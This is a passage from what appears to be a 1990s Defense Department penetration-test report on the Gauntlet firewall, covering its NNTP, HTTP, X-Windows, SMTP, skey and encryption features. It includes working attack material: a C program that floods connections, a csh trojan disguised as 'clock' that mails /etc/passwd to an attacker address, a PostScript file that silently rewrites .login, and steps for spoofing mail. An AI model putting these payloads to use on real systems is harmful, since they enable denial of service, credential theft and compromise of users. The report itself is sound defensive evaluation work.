<p>
<a name="NNTP">
4.  NNTP (Plug-gw)<p>

	According to Cheswick and Bellovin (p. 45) the authors of  
``Firewalls and Internet Security -- Repelling the Wily Hacker,'' 
The Network News Transfer Protocol dialog is similar to that used 
for SMTP.  Incoming and outgoing news articles could be processed 
and relayed by the firewall machine in much the same way as SMTP 
e-mail is relayed. However, there are several disadvantages to 
using this approach: 
(1)  netnews consumes vast amounts of disk 
space, file slots, inodes, CPU time, etc.   In addition, there 
is significant administrative effort required to maintain the 
associated programs needed to keep netnews alive and well.  
(2) because of the chance of compromise of the firewall machine, 
no company-proprietary newsgroups should reside on the gateway, 
thus the firewall machine should not act as an internal news hub. <p>

	 In the case of the Gauntlet firewall, the firewall acts as a 
relay program to let the news articles pass directly to the inside 
news hub via a plug gateway acting as  proxy for the NNTP service.  
In this way, the risks stated above are significantly minimized.  <p>

	  	<i>Tests</i>:  There are few documented attacks involving the 
NNTP protocol.  Based on the information that the Network News 
Transfer Protocol (NNTP) is similar to SMTP, the X31 Gauntlet Firewall 
test team hypothesized that some of the penetration tests performed 
on the SMTP service on a firewall could be modified and attempted 
against the NNTP service as well.  For example, denial of service 
attacks in which many connections to the news service in a short 
period of time may cause suspension of service for a period of time.  
In addition, sending a very large message file to the news service 
could also denial or suspension of service.  <p>

	<i>Observed Results</i>:  Due to time constraints tests of this 
nature were not actually performed against the NNTP service on 
the Gauntlet Firewall and are included here as general information only. <p>

<p>
<a name="http">
5.  HTTP / GOPHER<p>

	The World Wide Web (WWW) is a graphical Internet service 
with powerful linking capabilities.  This hypertext network of 
documents is rapidly becoming the most popular service on the 
Internet.  In order to navigate the WWW, the user must have 
client software called a browser.  An organization interested in 
offering information on the WWW must do so using software called 
a server.  There are numerous browser and server software packages 
available in the commercial market.  The Gauntlet firewall is 
equipped with a proxy which allows the http and gopher protocols 
(these are the protocols which are designed to request and retrieve 
information via the World Wide Web) to pass through the firewall 
so that internal users will have access to World Wide Web service 
on the Internet.  There are numerous security concerns surrounding 
the use of the Web, some of which are reduced by the use of a 
firewall to monitor the outgoing http requests.  However, some 
security issues such as trojan horses, viruses, denial of service 
attacks, and so on, remain problematic.  The following tests 
attempt to exploit some of these security issues: <p>

<p>

	<i>Test #1</i>:  Telnet to port 80 and send HTTP commands.<p>

<p>

	<i>Purpose</i>:  This test attempts to send commands through a 
port which should not be authorized to accept those commands.  <p>

<p>

	<i>Procedures</i>:<p>

POST Attempt:<p>

badguy# <b>telnet 222.222.22.3 80</b><p>

Trying 222.222.22.3 ...<p>

Connected to 222.222.22.3.<p>

Escape character is `^]'.<p>

POST /test<p>

<p>

HTTP 1.0 403 Error<p>

Content-type:  text/html<p>

<p>

&lt;h1&gt;Error- 403 &lt;/h1&gt;<p>

&lt;HR&gt;<p>

&lt;PRE&gt;<p>

Sorry, Access denied for unknown (222.222.22.2) &lt;br&gt;<p>

&lt;/PRE&gt;<p>

&lt;br&gt;&lt;hr&gt;<p>

&lt;A HREF=''http://gauntlet.peaceful.mil: 
80/http://-internal-/-http-gw-internal- /version.html''&gt;http-gw 
version g3.0.3/ 0&lt;/A&gt; (gauntlet.peaceful.mil)<p>

Connection closed by foreign host.<p>

<p>

DELETE test<p>

<p>

badguy# <b>telnet 222.222.22.3 80</b><p>

Trying 222.222.22.3 ...<p>

Connected to 222.222.22.3.<p>

Escape character is `^]'.<p>

DELETE /*<p>

Error<p>

---------------------------------------------------------<p>

No default server configured to handle your request<p>

DELETE /*<p>

Connection closed by foreign host<p>

#<p>

<p>

	<i>Expected Results</i>:  The firewall should refuse the connection.<p>

<p>

	<i>Observed result</i>:  Connection was refused.<br><p>

<p>

<p>

	<i>Test #2</i>:  Denial of service attack:  A program was run on badguy 
that continually opened port 80 on the firewall and left it open.  
The program was run multiple times consecutively to simulate a flooding attack.  <p>

<p>

	<i>Purpose</i>:  To deny service through the firewall by flooding 
the firewall with http connection requests. The program is as follows:<p>

<p>

/************************************************************************/<p>

/* Program: many_connects.c 												*/<p>

/* Author:  Paul Hammersly and Todd Paisley- DOD						*/<p>

/*																		*/<p>

/* This program endlessly establishes a HTTP connection to a server and */<p>

/* reports back the reaction time....									*/<p>

/*																		*/<p>

/************************************************************************/<p>

#include &lt;stdio.h&gt;<p>

#include &lt;stdlib.h&gt;<p>

#include &lt;string.h&gt;<p>

#include &lt;errno.h&gt;<p>

#include &lt;sys/types.h&gt;<p>

#include &lt;sys/socket.h&gt;<p>

#include &lt;netdb.h&gt;<p>

#include &lt;unistd.h&gt;<p>

#include &lt;netinet/in.h&gt;<p>

#include &lt;arpa/inet.h&gt;<p>

#define TRUE 1<p>

#define FALSE 0<p>

typedef enum { OPEN, CONNECT, WRITE, READ, CLOSE } STATE;<p>

#define MAXHOSTNAME 1024<p>

#define MAXSOCK 42<p>

#define HTTP_SOCKET 80<p>

#define OUTPUT_CHARACTER_LIMIT 80<p>

#define HOST ``bob.pcom.mil''<p>

<p>

void main()<p>

   {<p>

    struct hostent *host_entry;<p>

	int sock[MAXSOCK];<p>

    int stat;<p>

    struct sockaddr_in sock_in;<p>

    int i;<p>

    unsigned long inet_temp;<p>

    long total_bytes = 0;<p>

	int first = TRUE;<p>

	/* Check to see if argument is a name.... */<p>

    if ((host_entry = gethostbyname(HOST)) == NULL)<p>

	   {<p>

	    /* Hmmm...  Check to see if argument is a IP address... */<p>

        <p>

        if ((inet_temp = inet_addr(HOST)) == INADDR_NONE)<p>

	       {<p>

		    /* Doh!  Can't find host....*/<p>

	        printf("Error: %s is an unknown host\n", HOST);<p>

	        exit (99);<p>

	       }<p>

		else<p>

		   /* Host found.  Put in structure...*/<p>

           sock_in.sin_addr.s_addr = inet_temp;<p>

	   }<p>

	else<p>

	   /* Host found, Put in structure... */<p>

       memcpy((char *) &amp;sock_in.sin_addr, host_entry-&gt;h_addr,<p>

		       host_entry-&gt;h_length);<p>

	/* Loop until the end of time.... */<p>

 	while (TRUE)<p>

	   {<p>

 	    /* Loop to create a lot of sockets.... */<p>

 	   <p>

        for(i=0;i&lt;MAXSOCK;i++)<p>

	       {if (!first)<p>

		       close(sock[i]);<p>

		    /* Create socket.... */<p>

		    if ((sock[i] = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0)<p>

		       {<p>

			    /* Hmmm...  Can't create a socket...  Abort... */<p>

		        printf("error creating socket...\n");<p>

	    	    perror("");<p>

		        exit(99);<p>

		       }<p>

	        /* Fill in structure socket info and attempt to connect... */<p>

	        sock_in.sin_family = AF_INET;<p>

	        sock_in.sin_port = htons(HTTP_SOCKET);<p>

	        stat = connect(sock[i], (struct sockaddr *)&amp;sock_in, <p>

	                       sizeof (sock_in));<p>

	        if (stat != 0)<p>

	           {<p>

				/* Doesn't want to connect...  Abort....  */<p>

		        printf ("error on connect, errno = %d\n", errno);<p>

		        perror("");<p>

		        exit (99);<p>

	           }<p>

	       } <p>

		first = FALSE;<p>

	   <p>

	   }<p>

	/* Huh???? How did we get out of the infinite loop?  Dunno.  <p>

	   Better exit... */<p>

    exit (0);<p>

}<p>

<p>

	<i>Expected result</i>:  The firewall performance would degrade and 
eventually it would deny any more requests.<p>

<p>

	<i>Observed result</i>: With only one of these programs running, 
the firewall performance became sluggish but continued to operate.  
With multiple consecutive occurrences, the firewall started rebooting 
itself.  Errors included ``kernel: mb_map full'', ``trap with null curproc'' 
and ``vmfault(F0762300,0,1,0)-&gt; type c code 0''<p>

<p>

	<p>
<a name="X">
6.  X-WINDOWS<p>

	The X-window System is a network-based graphics window system.  
It is based on the client- server model.  The architecture has two main 
parts:  X servers which control displays and track user input and X 
clients which send requests to the X server.  The client and server can 
reside on the same machine or two separate machines.  These separate 
machines may have a firewall located between them.  <p>

		Because of some difficulties with the configuration, the 
Gauntlet test team did not perform an extensive testing regimen 
against the X-windows proxy on the Gauntlet firewall.  However, 
based on known attacks against X-windows, the following information is provided:<p>

	The Gauntlet firewall allows the X Windowing system to run 
through a proxy on the system. If this X proxy does not perform 
filtering on the inbound displays, multiple X windows could be 
sent to flood a terminal causing a denial of service.  Even if 
filtering does occur, capturing the telnet session and continuously 
replaying it later could have the same harmful effect.  Another 
vulnerability of the X-window system is that an X client can monitor, 
as well as take control over a large number of X events.  There are 
programs available in which an attacker, executing a program on the 
X server machine, can capture the authorized user's keystrokes.  In 
addition, by taking over X resources such as the X server and the 
keyboard, a malicious X client can cause a denial of service (System 
Security Profile for OSIS, November 1994)<p>

	<p>
<a name="smtp">
7.  SMTP (E-MAIL)<p>

	Electronic mail is likely to be a frequent target of attacks on 
any network.  The sendmail program via the SMTP protocol is designed 
to handle electronic mail delivery between users.  The application 
proxy on the Gauntlet firewall helps ensure that all mail into the 
internal network is mediated.  The Gauntlet firewall  proxy restricts 
direct access to the Sendmail program and limits the functionality of 
an SMTP connection to only those functions necessary for the transfer 
of mail. By properly configuring the flow of mail through the firewall 
many of the known vulnerabilities of the sendmail program can be eliminated. 
However, there are still attacks that can be mounted against an internal 
network via the SMTP protocol.  Note that these attacks ar likely to 
succeed against ANY firewall that is protecting the network.  The following 
tests attempt to demonstrate these remaining vulnerabilities:<p>

 <p>

	<i>Test #1</i>:  Mail Spoof<p>

<p>

	<i>Purpose</i>:  This test demonstrates the Gauntlet firewall does not 
defend against the known spoofing vulnerability in the SMTP protocol.  <p>

<p>

	<i>Procedures</i>:<p>

1) telnet to port 25 (the SMTP port) of the gauntlet.<p>

badguy% telnet gauntlet.peaceful.mil<p>

2) Type ``mail''<p>

3) Type ``mail from: clinton@whithouse.gov''<p>

4) Type ``rcpt to: root@pacom.mil''<p>

5) Type ``data''<p>

6) Type any message desired.  End the message with a single period on a line.<p>

<p>

	<i>Expected Results</i>:  An attacker from any host, inside or outside the 
protected network, may hide his identity by claiming to be another user.  
If this test is successful it is not possible for a mail recipient to  
identify with complete certainty the sender of the mail message.  [Note:  
This vulnerability is common to any firewall passing SMTP traffic that 
does not authenticate/encrypt the traffic.]<p>

<p>

	<i>Observed Result</i>:  Test was successful.  The mail message was 
passed through the Gauntlet firewall to the root user on the protected 
side that appeared to be from the President.<p>

<p>

<p>

				<i>Test #2</i>:  Mail a trojan horse attack in as 
executable attachment.  This attack attempts to automatically mail a 
copy of the protected networks /etc/passwd out of the protected network.<p>

<p>

	<i>Purpose</i>:  This test demonstrates the Gauntlet firewall does not 
defend against an attacker embedding a trojan horse attack in an executable 
mail attachments.  [Note:  This vulnerability is common to any firewall 
that permits passing executable attachments.]<p>

<p>

	<i>Procedures</i>:<p>

1) Create a trojan horse program.  Below is an extremely simple one 
used only to demonstrate the attack.<p>

<p>

     Copy the UNIX program ``clock'' into the users home directory.<p>

     Open this file in the vi editor.  <p>

     Delete the contents of this file.<p>

     Insert the following: <p>

      #! /bin/csh<p>

      mail -t root@attack.mil /etc/passwd<p>

      clock &amp;<p>

     Save this in the ``clock'' file.<p>

<p>

2) Compose a mail message using the UNIX mailtool program.  <p>

    TO: root@pacom.mil<p>

    From: yourfriend@attack.mil<p>

    Subject: Hey friend - look at this cool clock...<p>

3) Cut and paste the file ``clock'' as an attachment.<p>

4) Send the mail message.<p>

<p>

The recipient of the message reads the mail message and double 
clicks on the clock icon in the attachment portion of the message.  
A clock runs on the screen.  <p>

<p>

	<i>Expected Results</i>:  An attacker is able to get a user on the 
protected network to unknowingly execute a trojan horse attack by 
embedding the attack code in a normally benign executable file (e.g. a game).  
Each time the recipient executes the program, the embedded trojan 
horse is also executed.  Each copy of the program passed on to other users 
will contain the trojan horse.  The trojan horse runs with the same 
privileges as the users executing it.   <p>

<p>

	<i>Observed Result</i>:  The mail message was delivered by the Gauntlet firewall.  
The recipient clicked on the clock icon and the trojan horse was executed.  
The embedded commands mailed back a copy of the /etc/passwd file through the 
Gauntlet firewall to the attacker without the recipients knowledge.<p>

<p>

		<i>Comment</i>: The amount of damage a trojan horse can do is 
nearly limitless.  Embedding a trojan horse in an executable attachment 
is a very simple way to attack a network.  One method of protecting 
against this is to implement policy which disallows  user execution 
of mail attachments Another method is to only permit the transfer of 
attachments through the authenticated ftp service. <p>

<p>

<p>

	<i>Test #3</i>: Embedded Postscript Commands Attack.  This demonstration 
of the attack attempts to automatically modify the .login file of the recipient.  <p>

<p>

	<i>Purpose</i>:  This test uses Postscript commands embedded in a 
Postscript document to compromise an internal system.<p>

<p>

	<i>Procedures</i>:<p>

1)  Create a malicious postscript document as follows:<p>

<p>

%!PS-Adobe-3.0<p>

%%BoundingBox: (atend)<p>

%%Pages: (atend)<p>

%%PageOrder: (atend)<p>

%%DocumentFonts: (atend)<p>

%%Creator: Frame 4.0<p>

%%DocumentData: Clean7Bit<p>

%%EndComments<p>

%%BeginProlog<p>

/buff 1000 string def<p>

/infile (.login) (r) file def<p>

infile buff readstring<p>

infile closefile<p>

pop<p>

/str exch def<p>

/bufflength str length def<p>

/outfile (.login) (w) file def<p>

outfile buff 0 bufflength getinterval writestring<p>

outfile (\nInsert malicious code here) writestring<p>

outfile closefile<p>

%<p>

[Rest of Postscript File Follows}<p>

<p>

When displayed, this Postscript file should display the graphical 
page while reading and modifying the .login file in the background 
(unbeknownst to the user).<p>

<p>

2) Attach document to mail message and send to unsuspecting 
user on internal system. <p>

<p>

3) The recipient opens mail message and views document using 
a postscript viewer, thereby compromising the system.<p>

<p>

	<i>Expected Results</i>:  An attacker is able to get a user on 
the protected network to unknowingly execute commands by embedding 
the code in Postscript file.  The commands execute with the same 
privileges as the mail recipient.   <p>

<p>

	<i>Observed Result</i>: The Gauntlet firewall passed the message 
with the attached Postscript file to the internal system. The 
Postscipt file modified the .login file of the recipient when 
viewed using both Ghostview and Ghostscript.<p>

<p>

	<i>Comment</i>: This attack is likely to succeed when run against 
even a security conscious user.  Word processing attachments 
are often thought of as text files.  A site with a strictly 
enforced policy against running executables received via mail 
may still be vulnerable to this attack.  <p>

<p>

<p>

	<i>Test #4</i>:  Denial of mail service through establishing the 
maximum number of SMTP sessions.<p>

<p>

	<i>Purpose</i>:  This test is designed to determine the number 
of sessions the Gauntlet Firewall allows before its ability to 
provide mail service is effected.  <p>

<p>

	<i>Procedures</i>:<p>

1) Login to the outside terminal (host: badguy, user: euser1).<p>

2) Create a command script with the line ``./slow-roll gauntlet.peaceful.mil'' 
repeated 260 (arbitrary large number) times; call the script ``slow-roll-260''.  <p>

3)Execute the script.<p>

4) Monitor the network to determine when the maximum number of 
SMTP session limits have been reached.<p>

<p>

				<i>Expected Results</i>: Mail service unavailable.<p>

<p>

	<i>Observed Result</i>:  Gauntlet firewall accepted 246 SMTP session 
requests before the Sun SparcStation 20 (badguy) ran out of swap space. 
Analyzing the traffic on the sniffer showed an increase of session requests 
by the attacking machine led to an increase in retransmission requests by 
the firewall.  The firewall did not acknowledge the requests fast enough, 
thus the requests were timing out.  However, it was possible to establish 
an additional SMTP session from the Gauntlet firewall  using the DOS 
computer (worseguy). Acknowledgment of additional session requests 
by the firewall took from a few seconds up to three minutes.<p>

<p>

During one test run, the firewall displayed  the error message 
``Feb 5 14:29:58 bob Kernel: mb_map_full''.  During another, 
the Gauntlet rebooted automatically.<p>

<p>

	<i>Comment</i>: <p>

It appears the Gauntlet firewall will allow as many sessions as 
there are ports available. The limiting factor is the firewall 
memory (which may have caused the above error and reboot). The 
Gauntlet firewall gives no indication/warning that it is running out of memory.<p>

<p>

<p>
<a name="auth">
8.  AUTHENTICATION USING SKEY<p>

	The authentication options of the Gauntlet firewall include: 
plaintext password, Digital Pathways Secure Net Key (SNK) and skey.  
Skey is a freely available software authentication system from Bellcore.  
It is included ``as is'' with the Gauntlet firewall software. 
The Trusted Information Systems Gauntlet firewall version 3.1 will 
incorporate FORTEZZA authentication as an additional option.  
For the purposes of the current Gauntlet testing effort, skey 
was the strong authentication mechanism in use.<p>

	The version of the skey delivered with the Gauntlet firewall 
uses the MD4 algorithm for authentication.  It should be noted that
 members of the public sector have pursued breaking MD4 with 
surprising success.  Bert den Boer and Anton Bosselaers successfully 
cryptanalyzed two of the algorithms three rounds.  Ralph Merkle 
successfully attacked the first two rounds and Eli Biham was 
investigating a possible differential cryptanalysis attack 
against two-thirds of MD4.  (Public source:  Bruce Schneir, 
Applied Cryptography). <p>

	The skey authentication system also uses the MD5 algorithm.  
This algorithm was on the Gauntlet firewall, but was not compiled 
in the version of the firewall  tested.  The MD5 algorithm was 
created due to the weaknesses discovered in MD4, and no public report 
of the success of cryptanalytic attacks against this algorithm is 
known to the team. The team recommends that the Gauntlet firewall 
be equipped to use the MD5 algorithm, vice MD4,  as the default 
algorithm with the skey system.  In addition, the team believes 
that the addition of the FORTEZZA strong authentication capabilities 
to the Gauntlet firewall will significantly improve the security 
available through the firewall.<br><p>
<a name="crypt">
<br>9.  ENCRYPTION CAPABILITIES    provided by Lisa Mitchell at Mitre<p>

	Firewall-to-firewall encryption is used by firewalls and other 
networking products to provide privacy, authentication, and integrity 
of data communications between remote sites on public networks, such 
as the Internet.  The combination of IP tunneled sites (IP tunneling 
is another term for firewall-to-firewall encryption) is called a 
virtual private network (VPN).  The VPN is a virtual network because 
all traffic transmitted and received by the remote sites on the VPN 
is tunneled through the intervening network; the remote sites have 
no knowledge of the intervening network.  The VPN is private because 
only the sites that comprise the VPN can encrypt and decrypt network traffic.  <p>

	Encryption occurs at the network layer (IP-level) so that all 
protocols can be securely tunneled; this type of encryption is 
preferable to proxy-level encryption because proprietary protocols 
can be tunneled without having to create a proxy for each protocol.  
Typically, the decision to tunnel is based on source and destination 
IP addresses although it may also be based on Transmission Control 
Protocol (TCP) port numbers, allowing flexibility in deciding which 
applications will be tunneled between which networks.  <p>

	Privacy in a VPN is implemented via encryption that employs either 
secret or public key technology (public key technology is generally 
used for the key exchange).  For secret key encryption, the most popular 
algorithms used are the Data Encryption Standard (DES), triple-DES, and 
the International Data Encryption Algorithm (IDEA).  For public-key 
encryption, the RSA algorithm is the most widely used.  <p>

	In the Trusted Information Systems, Inc. Gauntlet firewall (V. 3.0) 
encryption is performed using either a software-based DES algorithm that 
is bundled as part of the product or an Extended Industry Standard 
Architecture (EISA) - bus bulk DES encryption board that must be purchased 
separately.  The focus of the testing will be on the hardware based 
encryption as it is much faster than the software based capability.<p>

	<i>Test #1</i>:  Performance Testing:<p>

	<i>Purpose</i>:  The purpose of this test is to determine the impact 
of IP encryption on communications between remote networks.  Note that 
this test was conducted by MITRE as part of a Community Open Source 
Program Office (COSPO) task for the Open Source Information System (OSIS).  
A beta version of the Gauntlet 3.0 was used for the COSPO performance testing.  
The testing configuration was similar, but not exactly the same as, the 
test configuration for all other tests in this report (APPENDIX A).   
Full details of the COSPO testing can be found in the document ``Final 
Firewall-to-Firewall Encryption Report, Including Costs'', dated 14 July 1995.<p>

	<i>Procedures and Observations</i>:  In this test configuration Sun 
SPARC Classic machines were first run as firewall machines, then 
replaced with the Gauntlet firewall machines; the Suns were configured 
as standard OSIS firewall proxy machines.  The Gauntlet firewalls were 
installed via the gauntlet-admin interface..  Basic system configuration 
information was entered via this interface.  This information included 
the host name, domain, TCP/IP address setup for inside and outside 
interfaces, interface names and flag, trusted and untrusted network 
tables, and Domain Name Service (DNS) name resolution information.  
Routes were added to the external and internal IP routers because the 
Gauntlet functions as a router, not a bastion host, when used with 
IP-level encryption .   In order to configure the Gauntlet firewall 
3.0 for IP tunneling, only two items of information were needed; an 
identifier for the local network that is protected by the firewall 
and an identifier for the remote networks to which encrypted traffic 
should be tunneled.  This information is provided to the Gauntlet 
firewall through the optional configuration interface.  This interface 
allows logical names to be defined for these networks in order to make 
the relationships between the networks more readable.  If a logical name 
is not desired, the network address can be entered instead.  After the 
information is entered, the administrator rebuilds the Gauntlet firewall 
configuration; the encryption information is then built into the netperm 
table.  For this test, two separate networks were identified as trusted 
networks and each Gauntlet firewall was configured such that one network 
was the local trusted network and the other network was the remote trusted 
network.<p>

Next, a secret password is selected for each pair of trusted networks; 
this password must be the same for each pair at each Gauntlet firewall 
and is the secret key used to encrypt and decrypt traffic for each pair 
of networks.  For this test, since there were only two trusted networks 
identified, only one secret password was entered.  If there were five 
sites, four secret passwords would be stored at the Gauntlet firewall at 
each site.  There are no restrictions that ensure that these passwords 
are not the same for each pair.<p>

The performance tests were file transfer tests that were run by scripts; 
the scripts are included in appendix B.  The scripts performed multiple 
file transfers using the File Transfer Protocol (FTP).  One megabyte 
files were transferred and 1, 2, 4, 8, 16, and 24 FTP simultaneous 
connections were run.  The average transfer time for each FTP transaction 
was calculated.  The throughput was calculated using the number of 
successful connections per average transfer time.  The tests were run 
until the throughput leveled out.<p>

The performance tests were run first with the Sun SPARC Classic
 machines as firewalls, then Gauntlet firewalls without encryption, 
then Gauntlet firewalls with encryption.  It is expected that Gauntlet 
firewalls without encryption will be faster than Gauntlet firewalls 
with encryption.<p>

		<i>Observed Results</i>:  The table below provides the results 
for the Gauntlet Firewall.  The table entries are in megabytes per second.  <p>

<p>

<center>
<b>Table 1. Gauntlet 3.0 Troughput test Results (Mbyte/second)</b>
<table border=2 Cellpadding=4>
<tr>
<td><b>Number of<br>
Simultaneous<br>
Transactions</b></td>

<td><b>Suns</b></td>

<td><b>Gauntlet<br>
without<br>
Encryption</b></td>

<td><b>Gauntlet<br>
with<br>
Encryption</b></td>
</tr>

<tr>
<td>1</td>
<td>0.037</td>
<td>0.132</td>
<td>0.128<td>
</tr>

<tr>
<td>2</td>
<td>0.077</td>
<td>0.158</td>
<td>0.128</td>
</tr>

<tr>
<td>4</td>
<td>0.137</td>
<td>0.150</td>
<td>0.146</td>
</tr>

<tr>
<td>8</td>
<td>0.169</td>
<td>0.168</td>
<td>0.169</td>
</tr>

<tr>
<td>16</td>
<td>0.181</td>
<td>0.196</td>
<td>0.175</td>
</tr>

<tr>
<td>24</td>
<td>0.181</td>
<td>0.219</td>
<td>0.175</td>
</tr>

</table>
</center>
<p>

The test results indicate that Gauntlet firewalls with encryption 
outperformed the Sun SPARC Classic machine for small numbers of 
simultaneous transfers; as the number of transfers increased, the 
Sun's throughput matched and then surpassed that of Gauntlet 
firewalls with encryption.  However, even at 24 simultaneous 
transfers, the difference in throughput was not substantial; the Suns' 
throughput was only 3.3% higher than that of Gauntlet firewalls with 
encryption.  Gauntlet firewalls without encryption consistently 
outperformed the Sun machine.  At 24 simultaneous transfers, the 
throughput of Gauntlet firewalls without encryption was 20% higher 
than that of Gauntlet firewalls with encryption and 17.35% higher 
than that of the Suns.<p>

	<i>Test Analysis</i>:<p>

The results of the Firewall to Firewall Encryption testing showed 
that IP tunneling in Gauntlet Firewalls  is slower than the 
Gauntlet firewalls transparent proxies but is not appreciably 
slower than the Sun proxy firewalls.<p>

	<i>Comments on Firewall to Firewall Encryption</i>:<p>

	The Gauntlet firewalls used symmetric-key cryptography for 
firewall to firewall encryption, which means that the secret key 
used for each pair of trusted networks is used for both encryption 
and decryption.  A key management structure must be established such
 that each Gauntlet firewall that will be paired with other Gauntlet
 firewalls receives the keys associated with the pairs in a secure 
fashion; the Gauntlet firewall does not provide such a mechanism.  
One solution is that a central authority determine the secret keys 
for each pair of sites and distribute them to each site via secure 
channels (e.g., secure E-Mail) prior to initial installation.<p>

The secret keys that are associated with each pairing of trusted 
networks are stored on the Gauntlet firewall machine in the clear.  
This requires that the Gauntlet firewall be physically protected and 
that access to the firewall machine is restricted to the authorized 
firewall administrator.<p>

Firewall-to-firewall encryption in the Gauntlet firewall (V3.0) is 
based only on source and destination IP addresses, so that all traffic 
between any two remote sites is encrypted. The Gauntlet firewall does 
not allow one to encrypt based on port number (i.e., application) in 
conjunction with the IP addresses.  As a result, the Trusted Information 
Systems, Inc. Gauntlet firewall cannot be used to encrypt network traffic 
based on application (e.g., encrypt TELNET and FTP traffic, do not encrypt 
electronic mail).<p>

	<i>Summary of Firewall to Firewall Encryption</i>:<p>

Firewall-to-firewall encryption does not appear to make a large 
performance impact on communications.  Its major impact is on 
protection and management of the secret keys, which can be 
addressed by providing physical protection and access control 
of the Gauntlet firewall  machine itself and by establishing a 
management structure for the creation and secure distribution of 
the secret keys, respectively.  The Gauntlet firewall's  inability 
to encrypt based on application type as well as source/destination 
is addressed in version 3.1 of the Gauntlet firewall product.  As 
enhancements to performance, key management, and IP tunneling are
 announced, identical or additional testing should be performed to 
verify these new capabilities.<p>

<p>

